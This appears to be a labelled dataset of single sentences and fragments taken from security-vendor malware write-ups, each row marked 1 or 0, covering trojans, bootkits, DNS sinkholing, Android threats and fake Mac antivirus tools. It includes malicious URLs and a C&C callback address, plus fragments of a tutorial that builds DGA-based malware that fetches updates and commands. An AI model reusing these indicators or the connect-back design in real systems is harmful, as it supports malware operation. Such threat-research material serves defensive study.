2895	This should work for samples that are (1, 2 or 4, but not 3 bytes) XOR encrypted.Figure 7 Stage 1 Download ContentFigure 8 Double Byte XOR Encrypted PayloadPayload AnalysisEven though “winword.pkg” is an executable husk to host malicious code downloaded at the second stage, it contains a mouse-click check to detect human behaviors.	1
2896	The webpage itself is also changing regularly (giving different filenames, among other things), and we’re now detecting it as Mal/WaledJs-A.	1
2897	Below we can see that the IP address 127.0.0.1 was returned to the DNS query of the rereewqoerjeor.infosec domain name.	1
2898	Sophos products detect the attack as the Troj/Agent-AAJO and Troj/Agent-AANK Trojan horse.	1
2899	The malware arrived into one of our spam collection points with an attachment named UPS_document.zip.	1
2900	In the image the DNS Sinkhole returns with an IP of 127.0.0.1 to force the client to connect to itself instead the bot controller domain.	1
2901	One earlier version we saw for Google Chrome, detected as JS_FEBUSER.A, identifies itself as Chrome Service Pack 5.0.0.	1
2902	An updated version of the plugin, detected as JS_FEBUSER.AB, is identified as F-Secure Security Pack 6.1.0 (for Google Chrome) and F-Secure Security Pack 6.1 (for Mozilla Firefox) .	1
2903	This in turn was another malicious Javascript exploiting a media player plugin vulnerability (MS06-006) in order to download a malicious Win32 downloader Trojan (detection for this is being published as Mal/DownLdr-H).	1
2904	In this attack, the web server in question is running  Microsoft-IIS/6.0 on Windows Server 2003.	1
2905	The C&C server replies with Content-Type “image/jpeg” which contains JPEG image with malicious commands hidden inside.	1
2906	The values within the JPEG are the malicious commands that instruct the Monkif to infect victim systems.	1
2907	"Decrypted config file

2910	This file ressembles to a malware family called Win32/Agent.RAZ used for political attacks in the last two weeks.	1
2911	The attacks themselves followed a consistent playbook throughout the observed timeframe; using weaponized Microsoft Word documents initially containing an exploit for only CVE-2012-0158, appearing to use the highly popular ‘Tran Duy Linh’ toolkit, then adding in an additional exploit for CVE-2014-1761 in the three newest samples we collected.	1

Vulnerability Targeted
CVE-2012-0158 and CVE-2014-1761
Tools Used
Cmstar and BBSRAT
Description
Weaponized Microsoft Word document found titled ‘Зика Монголд ойртсоор’ (Zika closer to Mongolia)."	1
2917	Exploits for both CVE-2012-0158 and CVE-2014-1761 used, dropping a separate, newer variant of Cmstar which downloaded BBSRAT as its final payload.	1
2918	It seems that an errant IFRAME tag has made its way into the website’s initial page (default.asp) and eventually loads a malicious web page (hxxp://www.832821.cn/rrr.htm) that is completely unaffiliated with the high school.	1
2919	"Elsewhere, we have
gta5moneyhackonline(dot)com
which doesn’t beat about the bush, dispensing with pretty much everything other than a box asking for your info, desired money amount and a survey pop immediately after hitting the generate button."	1
2920	The “ttcopscli3acs” bit is the Windows domain name used on Target’s network.	1
2921	The first was a mention of a “bladelogic.exe” reference in the attack.	1
2922	They set a variable with the value of “3.13.37” — seriously.	1
2923	"The called URL would look something like http://31.184.234.96/jedi.php?version=0991&mother=
MALICIOUS CODE
This is final decoded malware that gets executed on the compromised sites."	1

We have been tracking the activity of the Rovnix bootkit family since April 2011."	0
3011	The reason for exploring further is the desire of the Rovnix developers to bypass antivirus detection.	0
3012	These variants with the internet blocking payload stopped using the bootkit component during the summer of 2011.	0
3013	The Carberp developers used droppers incorporating bootkit framework only up to the end of 2011.	0
3014	But we only have information relating to a really small percentage of infections with Rovnix based bootkit code.	0
3015	"A call graph of the main BkSetup.dll routines looks like this:
A new sample with a new version of the Rovnix bootkit framework is indirect evidence of renewed sales activity and in the near future we may possible be able to disclose details of the relationship between Rovnix and other malware families."	0
3016	The following figure shows the basic workings of the polymorphic decryption code.	0
3017	"The basic code blocks look like this:
[polymorphic code from Rovnix.B]
The reason for using polymorphic code is to bypass static signature detections by antivirus engines: this code can only be detected generically using emulation."	0
3018	"Changes in hidden file storage
The structure of the hidden file system looks similar to the previous Rovnix modification and has already been described in previous blog posts (Rovnix Reloaded: new step of evolution)."	0
3019	Rovnix.D seems to be a transitional version in preparation for something else, but at this moment we don’t have a clear understanding of what that might be.	0
3020	This module does not provide hooks and other malicious modifications to system memory, and is not generally detected by most common antivirus engines.	0
3021	"Conclusion
At this moment changes can be seen in the landscape of complex threats for the x64 platform."	0
3022	Olmarik/Olmasco (TDL4 and MaxSS modification) does not account for a large percentage of infections in the wild and has stopped evolving (The Evolution of TDL: Conquering x64).	0
3023	In my opinion the ways in which x64 systems can be infected are severely limited, and the search for something new requires ample time and considerable experience on the part of the developer.	0
3024	The Rovnix family used other ways to infect with modification of the VBR, but a constant stream of new modifications necessitates the provision of a great deal of debugging information to the C&C.	0
3025	For example the fully-featured builder costs $60.000 including basic support for half a year.	0
3026	In future, complex stealth technologies will mostly be used in targeted attacks, because the cost of buying and using them is not commensurate with the anticipated profit for typical cybercriminals.	0

Trojan.APT.BaneChant: In-Memory Trojan That Observes for Multiple Mouse Clicks

 by Chong Rong Hwa | Advanced Malware, Targeted Attack
SummaryLast December, our senior malware researcher (Mr. Abhishek Singh) posted an article about a Trojan which could detect mouse clicks to evade sandbox analysis."	0
3176	It also leverages multiple advanced evasion techniques to achieve stealth and persistent infection.	0
3177	Hence, we suspect that this weaponized document was used to target the governments of Middle East and Central Asia.This new malware is significant for several reasons:Overall, this malware was observed to send information about the computer and set up a backdoor for remote access.	0
3178	It was also observed that the attacker leveraged a shortened URL to “hide” malicious domains from automated analysis technologies.	0
3179	See Figure 1 for the first stage download scenario.Figure 1 Stage One DownloadThe attacker has designed the stage one malware to be merely a husk.	0
3180	It is because a majority of the malicious code is only available after downloading the second stage payload.	0
3181	By designing the malware this way, it makes it harder to perform incidence response and facilitates ease of update of malicious code.	0
3182	It made use of the dynamic DNS service provided by “NO-IP” to indirectly access the malicious domain.	0
3183	It is important to note that “ow.ly” is not a malicious domain.	0
3184	It is believed that the rational for such indirect access is to defeat automated URL blacklisting.	0
3185	As an excecutable file usually contains many zeros in series, the zeros would become the XOR key when XOR encoded.	0
3186	By examining the content using a hex editor, it is obvious that there are many “9E 44” repeated.	0
3187	By counting the DWORD with the highest occurance, it could be a probable XOR key if the file is XOR encrypted.	0
3188	It would look legitimate to users as it masquerades as a legitimate Google Updater.	0
3189	This information is posted to hxxp://symbisecure.com/adserv/get.php in Base-64 format.	0
3190	After doing a quick search, it seems to be a sound track composed by Hans Zimmer for the movie “The Dark Knight Rises” (see Figure 16).	0

Massive Site Compromise: The Siege Continues

Numbers of legitimate Web sites have again succumbed to another case of iFrame Search Engine Optimization (SEO) poisoning."	0
3195	"Proof is the following screenshot which shows how many search results turned up when the unlikely search term “nmidahena.com” is used:
This is yet another incident following what looks like a never-ending string of attacks that has compromised high-profile Web sites such as ZDNet Asia and TorrentReactor early last month."	0
3196	This may suggest that cyber criminals, apart from taking advantage of this SEO vulnerability are also testing which type of Web sites they may get more out of.	0
3197	Further investigations by Trend Micro Researchers reveal that the tool used in conducting this massive attack is not new, but in fact was already used in a similar attack last year.	0
3198	"This is a screenshot of one of the tools:
This recent turn of events shows that cyber criminals are clearly capitalizing on this method of distributing malware."	0
3199	However in March, almost all incidents involved the compromising of legitimate Web sites, this time affecting Web sites related to education.	0
3200	Despite this clear involvement of Google in this malware distribution, security researchers have taken Google’s side on the case, saying that the search engine is not directly responsible to these attacks.	0

Introduction
We all know there have been (and still is) a lot of malware lurking around the Internet."	0
3204	To understand the need for domain generation algorithms, we must first talk about how command and control servers have evolved in time and which methods are available to shut them down.	0
3205	Additionally, fighting against DGAs is not easy, since the domain names can be regenerated every day or even more frequently – every hour.	0
3206	We need to keep in mind that a large number of domains generated by malware using the DGA algorithm doesn’t exist and any try in resolving such domain names will result in the domain not being able to be resolved in an IP address.	0
3207	In [2] there’s a great explanation how DGAs can be used to communicate with C&C servers: let’s consider a DGA that generates a new domain to connect to every minute based on the following format: .com.	0
3208	If the DGA algorithm is only taking hours into account, then the malware sample should try to connect back every hour.	0
3209	It certainly depends upon what we’re doing and why we’re writing a malicious malware.	0
3210	"More specifically, we’ll take a look at the following:
Fill out the form below to download the associated code with this exercise."	0
3211	This means that the algorithm generates a new domain every day, which is then used by the malware to connect back to the C&C server.	0

3214	Breaking down adware detections even further, the Android.Adware.Mulad family is by far the most prevalent, summing up to 93.77% of the adware-ready apps weâ€™ve catalogued.	0
3215	Our top 10 chart strictly involves Trojans, exploits, and hacktools, leaving aside adware-injected apps, which are not malicious in nature.	0
3216	The battery optimization app is still the number one threat, meaning users are still unaware that the app can steal contact details and intercept SMS messages and emails.	0
3217	Gingerbread-running Android devices are mostly rooted with the help of Android.Exploit.GingerBreak.A.	0
3218	Compared to last month, Android.Hacktool.Faceniff.A jumped from 2.63% to 3.67%, suggesting that stealing social networks passwords and what-not is gaining traction and, implicitly, more value.	0
3219	Our stats reveal that India is the country most affected by malware and adware, with an infection rate of 8.41%.	0

Previous: A sting in the tail of the “Error Check System” Facebook scareNext: Should ISPs block access to illegal websites?"	0
3374	There has been much talk about the watering hole attack, where attackers first identify which websites the targeted group of people is using, infecting the webpage with malware and waiting for one of the targeted individuals to visit the website and potentially get infected.	0
3375	There’s also a payload, which connects back to the command and control (C&C) server and waits for actions to be done.	0
3376	That gives attackers the advantage of setting up the C&C server just for a day in order for infected machines to call home – after that has occurred, the attackers can shut down the C&C server and set it up again as the need arises.	0
3377	It’s imperative to understand that it matters how precise of a DGA algorithm we choose: if there are minutes used in a DGA domain generation algorithm, then the malware should try to connect back to that domain every minute; otherwise it loses the opportunity to achieve 100% accuracy.	0
3378	In the remainder of the article, we’ll setup a malware sample written in Python that uses a DGA algorithm to connect back to the C&C server.	0
3379	We can do that with the command below, after which we must also restart dnsmasq for changes to take effect.	0
3380	"Generating the Domain Name
Let’s suppose that we want to change the DGA domain every day, which is enough for our purposes, but still allows us to change the domain on a daily basis, to which the victims will connect back."	0
3381	Quite surely, CERT won’t register all domains, because there are already too many of them to go around.	0
3382	"def generate_domain(year, month, day):
 """""" Generates a domain by considering the current date. """""""	0
3383	Then the for loop generates the domain name, which is the same algorithm we’ve already seen in the Python code example.	0
3384	"*/
long main() {
 char* domain;
 time_t ctime = time(NULL);
 struct tm* ltime = localtime(&amp;ctime);
 unsigned long year = ltime->tm_year + 1900;
 unsigned long month = ltime->tm_mon + 1;
 unsigned long day  = ltime->tm_mday;
 printf(""Time  : %lu:%lu:%lu\n"", year, month, day);
 domain = generate_domain(year, month, day);
 printf(""Domain : %s\n"", domain);
 return 0;
}
We should also talk about the main program function where the time structure is being handled."	0
3385	From the structure it’s evident that the tm_year variable contains the number of years since 1900, which is why we must add 1900 to get the total number of years.	0
3386	"# gcc main.c -o main
What’s left is actually running the program that outputs the same domain as it did previously in Python code, which verifies that we’ve written it correctly."	0
3387	If a newer version is available on the server, the main.py is downloaded and the program is restarted.	0

3391	On the picture below, we can see the file is accessible and contains the newer version “1.1”.	0
3392	Then it checks whether the command has already been executed and quits if it has.	0

3394	It doesn’t provide an interactive session, which is useful when we want to exploit a server.	0
3395	Since we’re using Python, we can write the scheduler functionality by using the sched Python module, which implements an event scheduler that can be used to run tasks at specific times.	0
3396	"s = sched.scheduler(time.time, time.sleep)
s.enter(2*60, 1, update, (domain,))
s.enter(1*60, 1, command, (domain,))
s.run()
Once we’ve run the program, the following will be printed on the screen."	0
3397	"; after 1 minute
The main.py was successfully updated."	0
3398	It used to be the case that malware was connecting back to a single domain and after the domain has been removed from the DNS system, the compromised machines were no longer able to connect back to the C&C server – and the attacker wasn’t able to execute arbitrary commands on them anymore.	0
3399	After we’ve done that, we need to create a server, which can be HTTP, DNS, POP3, etc, whichever protocol the malware uses, and wait for the clients to connect.	0

Introduction
The security community is observing a sensible increase of botnet activities, in particular of cloud-hosted botnets that are mainly based on the Amazon cloud architecture."	0
3445	“Cheap hosting” providers represent a privileged choice for bad actors because they usually implement a poor monitoring system and a put in place a few safeguards to prevent bad bot origination.	0
3446	The DNS sinkhole is a technique adopted by principal security firms to analyze malicious traffic related to a botnet, spyware and any other kind of malware.	0
3447	The term sinkhole indicates a standard DNS server that is configured to provide non-routeable addresses in response to the DNS requests for all domains in the sinkhole.	0
3448	Practically, DNS sinkholing consists of the spoofing of the authoritative DNS for malicious domains.	0
3449	With this technique, specialists can analyze the overall traffic to an unwanted domain, estimate the entity of an infection, and apply the necessary mitigation strategy.	0
3450	DNS sinkhole could be used to mitigate different types of cyber threats that adopt DNS resolution.	0
3451	Security firms use it to analyze the connections to bad domains to discover the clients that have been compromised by the cyber threat.	0
3452	On the Internet numerous entities provide constant updates for these lists (e.g.	0
3453	Sinkhole administrators could benefit from these open sources that list bad domains.	0
3454	http://pgl.yoyo.org/as/serverlist.php?showintro=0 ).	0
3455	Note that there isn’t an official and authoritative list of sinkholes and the reason is intuitable.	0
3456	To avoid that, botnet operators implement mechanisms to avoid sinkholes.	0
3457	They could use a well-known DNS zone file to manage unwanted hosts and domains that are typically noted in public lists maintained by a community of security experts.	0
3458	"Sinkholes
One of most common Sinkhole solutions is based on an internal DNS sinkhole server that is used by administrators to impersonate an authoritative DNS server for blacklisted domains."	0
3459	The servers responds to the DNS queries for unwanted domains with private addresses.	0
3460	To improve overall security of systems, it is possible to adopt Intrusion Prevention Systems that analyze outbound DNS requests looking for anomalies in the related packers.	0
3461	This setting allows us to rapidly propagate changes.	0
3462	Another typical limitation of the technique is represented by its inefficiency to block malicious codes that don’t use an internal DNS server.	0
3463	As explained in a paper published by the SANS organization, a possible mitigation strategy for malware that doesn’t refer the internal sinkhole server is represented by the regimentation of outbound DNS queries.	0
3464	One of the principal problems is represented by a false positive.	0
3465	"Malware inside our network
Once a victim machine is infected by attackers, via phishing attack or a watering hole, the malicious agent dropped on the machine resolves a malicious domain name to retrieve the IP address for the command & control server."	0
3466	In this way, the malicious core retrieves the IP address for the bot controller and establishes the connection.	0
3467	Also, in this case the infected machine tries to resolve a malicious domain name to retrieve the IP address for the command & control server.	0
3468	The request is captured by the internal DNS Sinkhole server that acts as the authoritative DNS server and provides in response a fake IP address.	0
3469	In this way, the bot will not be able to contact the command & control server.	0
3470	"Real-time notification: Sinkhole and advanced detection
The identification of the malicious agent is just a part of the administrative work."	0
3471	To improve the above solution, it is possible to add an IDS with customized sinkhole signatures for realtime alerting.	0
3472	The DNS Sinkhole server responds to the DNS query sent by the malware, and the infected machine receives a legitimate IP address of the network.	0
3473	The administrator configures on this IP address a listening service on most common HTTP ports (e.g.	0

For the last month or so we have been carefully tracking the developments in the Mac OS X malware community."	0
3550	It’s advancing fast and taking many cues from the Windows malware scene.	0
3551	May 2, 2011: The first widely distributed fake security tool for OS X is being spread through poisoned Google Image search results, seemingly targeting random keywords and the death of Osama bin Laden.	0
3552	May 6, 2011: At this point, we’re seeing new variants almost daily.	0
3553	We also sometimes see the name change from MacDefender to Mac Security.	0
3554	This version ditches the Windows XP fake JavaScript screen and substitutes a very professional looking fake Finder that “detects” malware on your Mac.	0
3555	Early versions had the registration codes embedded in plain text, but now the registration codes are encoded so they are more difficult to discover.	0
3556	As Apple advises in their knowledge base article on the topic, this is a warning sign and an excellent opportunity to abort the installation.	0
3557	They now install into areas of the system that only require standard user privilege.	0
3558	On Windows the criminals did this to avoid UAC warnings, and have copied this trick to their Mac OS X releases.	0
3559	Perhaps you stumbled across it by clicking on a dangerous thumbnail while doing a search using Google Images.	0
3560	You don’t have a registration number?	0
3561	Unfortunately, you can’t tell what they plan to do with your credit card information – but you can be sure they’re up to no good.	0
